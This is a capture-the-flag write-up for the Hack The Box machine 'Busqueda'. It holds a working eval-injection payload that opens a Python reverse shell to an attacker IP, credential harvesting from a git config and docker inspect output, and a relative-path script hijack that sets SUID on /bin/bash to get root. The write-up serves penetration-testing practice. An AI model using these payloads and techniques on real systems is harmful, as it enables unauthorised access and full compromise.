# Busqueda Writeup

![machine](assets/machine.png)

Target host: 10.129.205.63
Performed TCP portscan.
```go
└──╼ $./rustscan -a 10.129.205.63 -- -sV -sC -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/nath/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.205.63:22
Open 10.129.205.63:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -A" on ip 10.129.205.63
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-10 10:44 AEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
Initiating Ping Scan at 10:44
Scanning 10.129.205.63 [2 ports]
Completed Ping Scan at 10:44, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:44
Completed Parallel DNS resolution of 1 host. at 10:44, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:44
Scanning 10.129.205.63 [2 ports]
Discovered open port 80/tcp on 10.129.205.63
Discovered open port 22/tcp on 10.129.205.63
Completed Connect Scan at 10:44, 0.49s elapsed (2 total ports)
Initiating Service scan at 10:44
Scanning 2 services on 10.129.205.63
Completed Service scan at 10:45, 7.18s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.205.63.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 11.04s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 2.12s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
Nmap scan report for 10.129.205.63
Host is up, received syn-ack (0.32s latency).
Scanned at 2023-04-10 10:44:53 AEST for 21s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.49 seconds
```

Navigating to the http server open on port 80 presents the following page.
![1](assets/1.png)

Scrolling a little further down the page, the application appears to be some sort a query builder for searching through search engines? Seems relativly useless.

The footer at the bottom page tells us that the application is built with flask and includes a links that tells us some information about it.
![2](assets/2.png)

Clicking on the searchor link brings us to the github page with the source code. When I saw this, my first thought was to look through the commit history or the pull request history to see if any information about vulnerable code could be found.
![3](assets/3.png)

While searching through the pull request history, I found [this](https://github.com/ArjunSharda/Searchor/pull/130) thread which talks about how the use of the eval function was removed from the application.

Knowing this information means that we should be able to exploit this to get a reverse shell.

## Reverse Shell
In order to exploit the target we will need to perform the following tasks
- Intercept the request sent from the client to the server
- Send the request to the repeater
- Write our payload
- Urlencode segments of the code where eval() and compile() are used

The following is the payload I used to get a reverse shell on the target machine.
```python
engine=Amazon&query=heythere'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",443));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'%2c'a'%2c'single'))%2b'
```

The first line and a half in the payload that is required to urlencoded is the following.
```go
+eval(compile('for x in range(1):\n import time\n 
```

For those who dont know, the eval() function evaluates python code and executes it if it valid.

The compile() function is required to be used in the statement because eval() only accepts dictonary objects. Therefore wrapping the payload in compile() creates an object that can be executed with eval().

The rest of the reverse shell payload is just a generic python reverse shell that can generated with Reverse Shell Generator [here](https://www.revshells.com/)

The request we will sending with burpsuite to a reverse shell is below.
```
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://searcher.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 315
Origin: http://searcher.htb
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

engine=Amazon&query=heythere'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",443));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'%2c'a'%2c'single'))%2b'
```

Upon sending the request to the server, we see the following.
```go
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.204.222] 48106
/bin/sh: 0: can't access tty; job control turned off
```

In the web servers root directory we find a .git directory with a config file that contains credentials for a user named cody.
```python
$ cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

We can also see a url which leads to a self hosted gitea service and the subdomain its hosted on.

After adding `gitea.searcher.htb` to our /etc/hosts file, navigating to `http://gitea.searcher.htb/` presents the following page.
![4](assets/4.png)

Navigating to the login page up in the top right corner of the interface, we should be able to login with the credentials we just found.
![5](assets/5.png)

Success! There appears to be an admin user that we will probably need in order to escalate privileges to root.

Apart from being able to see the source code of the webserver, theres not a lot of useful information in this repository.

Going back to the reverse shell, it appears that there are only 2 users on the machine that we can login using ssh.
```go
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash
```

Using the credentials for cody, I'm going assume that I can use them to log into ssh with the svc user.

Login Successful!
```go
svc@10.129.204.222's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr 10 06:03:35 AM UTC 2023

  System load:                      0.0
  Usage of /:                       81.4% of 8.26GB
  Memory usage:                     53%
  Swap usage:                       0%
  Processes:                        240
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.204.222
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:84a5


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
```

## Privilege Escalation
From here I attempt to elevate the user root with `sudo -l`
```go
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

When we attempt to execute the system-checkup script with python with `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *`, we see the following output.
```go
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

```

When we execute `docker-ps` as the script suggests, we can see the gitea service running and a mysql database.
```go
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 6 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 6 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

when I attempt to execute docker-inspect, I get the following output.
```go
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

As I dont use docker much myself, I wasen't entirely sure what sort of input `format` was supposed to take. From here I looked up the documentation on the [docker website](https://docs.docker.com/engine/reference/commandline/inspect/) for some direction.

At the bottom of the page I stumbled upon the following.
```go
docker inspect --format='{{json .Config}}' $INSTANCE_ID
```

Using the `--format` part of the command, I try executing the system-checkup script.
```go
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea
```

The command above produces the following output.
```json
{
    "Env":[
       "USER_UID=115",
       "USER_GID=121",
       "GITEA__database__DB_TYPE=mysql",
       "GITEA__database__HOST=db:3306",
       "GITEA__database__NAME=gitea",
       "GITEA__database__USER=gitea",
       "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
       "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
       "USER=git",
       "GITEA_CUSTOM=/data/gitea"
    ],
}
```

The output above isn't the full response, I've just reformatted it and extracted the most useful information.

As seen in the output above, this includes credentials for the Gitea user in the Gitea database.

When we inspect configuration for the mysql database with the following command.
```go
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
```

We also see the following parsed output.
```json
{
    "Env":[
       "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
       "MYSQL_USER=gitea",
       "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
       "MYSQL_DATABASE=gitea",
       "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
       "GOSU_VERSION=1.14",
       "MYSQL_MAJOR=8.0",
       "MYSQL_VERSION=8.0.31-1.el8",
       "MYSQL_SHELL_VERSION=8.0.31-1.el8"
    ],
}
```

Unfortunely, the credentials for the root user in the msql database are not same as the root credentials for the user on the machine.

However when we go back to the `http://gitea.searcher.htb` and login with the Administrator, we find that we are successful!
![6](assets/6.png)

When we navigate to the Administrators profile, we find an interesting repo named scripts. The scripts repo contains all the scripts that are owned by root on the machine and are located in `/opt/scripts`.

These `scripts` are also executed depending on the option we choose when we run `system-checkup.py`.

Below is the code that is executed when we run `system-checkup.py`.
```python
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)

```

The code blocks are we need to take the most notice of are below.
```go
def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


if action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

Run_command takes a list of arguments, executes them with bash and parses the output and returns it.

When the full-checkup option is received by the script, it assumes that the first argument will be `full-checkup.sh`.

Since the script assumes that `full-checkup.sh` is going to be executed in the same directory as `system-checkup.py` instead of specifiying the full path to the script. This means that we can exploit this functionaility for root by passing a malicious `full-checkup.sh` script instead.

## Root Shell
To exploit I this I performed the following.
```bash
cd /home/svc
mkdir .m0
cd .m0
nano full-checkup.sh
```

Inside `full-checkup.sh` I included the following
```bash
#!/bin/bash
chmod +s /bin/bash
```

I then entered the following commands.
```bash
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
/bin/bash -p
```

We have root!
```bash
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
ecosystem.config.js  root.txt  scripts	snap
```